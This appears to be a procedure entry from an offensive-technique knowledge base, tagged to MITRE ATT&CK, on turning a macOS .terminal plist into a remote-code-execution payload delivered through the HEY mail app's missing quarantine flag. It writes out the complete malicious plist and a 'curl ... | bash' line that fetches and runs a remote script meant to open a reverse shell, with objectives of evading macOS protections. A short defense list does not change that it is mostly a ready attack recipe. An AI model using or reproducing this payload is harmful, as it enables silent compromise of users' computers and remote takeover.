---
tags:
  - rce
  - payload-creation
  - macos
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-backdoor-download]]'
verified: false
platforms:
  - macOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:41.285Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 95d5c2e2-abda-4130-8186-484b0bfbcd0c
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Create-Malicious-Terminal-File

## Summary

This procedure creates a malicious .terminal file, an XML plist that embeds a command to download and execute a backdoor script, enabling RCE when opened in macOS Terminal without Gatekeeper intervention.

## Description

The HEY macOS app's Electron framework does not apply the com.apple.quarantine extended attribute to downloaded attachments, allowing executable files like .terminal to run silently. This procedure crafts such a file with a curl command that fetches a remote script to establish a reverse shell. Prerequisites include a hosting service for the payload script (e.g., via git.io) and basic XML editing knowledge. Expected outcome is a file that, when opened, downloads 'exploit.sh' and connects back to the attacker.

## Requirements

1. Text editor (e.g., vim or TextEdit) on macOS or Linux
2. Hosted payload script URL (e.g., https://git.io/vXd2N)
3. Network access to upload the script

## Defense

Defensive measures and detection strategies:

- Enable strict Gatekeeper settings and monitor xattr for quarantine attributes
- Scan email attachments with antivirus tools like ClamAV
- Log Terminal executions and network outbound connections on port 80

## Objectives

1. Generate a stealthy executable payload evading macOS protections
2. Embed reverse shell logic for remote access
3. Ensure compatibility with HEY app downloads

## Instructions

### Step 1: Craft the XML Plist Structure

**Context**: Create the base .terminal file as an XML property list with a CommandString key holding the malicious payload.

**Command** (No direct command; use editor):

Create 'exploit.terminal' with content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh</string>
    </array>
    <key>CommandString</key>
    <string>curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh</string>
</dict>
</plist>
```

> This embeds the curl command to download and pipe the script to bash, redirecting to exploit.sh for staging.

### Step 2: Test the Payload Locally

**Context**: Verify the embedded command executes correctly without errors.

**Command** ([[commands/curl-backdoor-download]]):

```bash
curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh
```

> Tests the download and execution; expect a file 'exploit.sh' created and potential connection attempt (use a test listener).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Command and Scripting Interpreter: Unix Shell

### Sub-Techniques

-

## Commands Used

- [[commands/curl-backdoor-download]]

## Tools Used

-

## Tags

- [[rce]]
- [[payload-creation]]
